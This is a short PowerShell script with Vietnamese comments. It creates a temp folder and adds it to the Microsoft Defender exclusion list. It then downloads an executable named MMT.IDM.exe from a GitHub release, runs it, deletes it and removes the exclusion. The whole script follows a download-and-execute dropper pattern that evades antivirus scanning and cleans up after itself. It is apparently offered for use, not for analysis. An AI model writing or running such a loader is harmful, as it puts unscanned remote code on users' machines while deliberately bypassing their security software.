# Xac dinh thu muc dich
$folderPath = Join-Path $env:TEMP "MMTPC"
$filePath   = Join-Path $folderPath "MMT.IDM.exe"

# Kiem tra bien truoc khi dung
if ([string]::IsNullOrWhiteSpace($folderPath)) {
    Write-Error "Khong xac dinh duoc duong dan folder."
    exit
}

# Tao thu muc neu chua ton tai
if (-not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
}

# Them exclusion
Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue

# Tai file
Invoke-WebRequest -Uri "https://github.com/ghostminhtoan/private/releases/download/MMT/MMT.IDM.exe" -OutFile $filePath -ErrorAction SilentlyContinue

# Chay file neu tai thanh cong
if (Test-Path $filePath) {
    Start-Process -FilePath $filePath -Wait
    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
}

# Xoa exclusion
Remove-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue
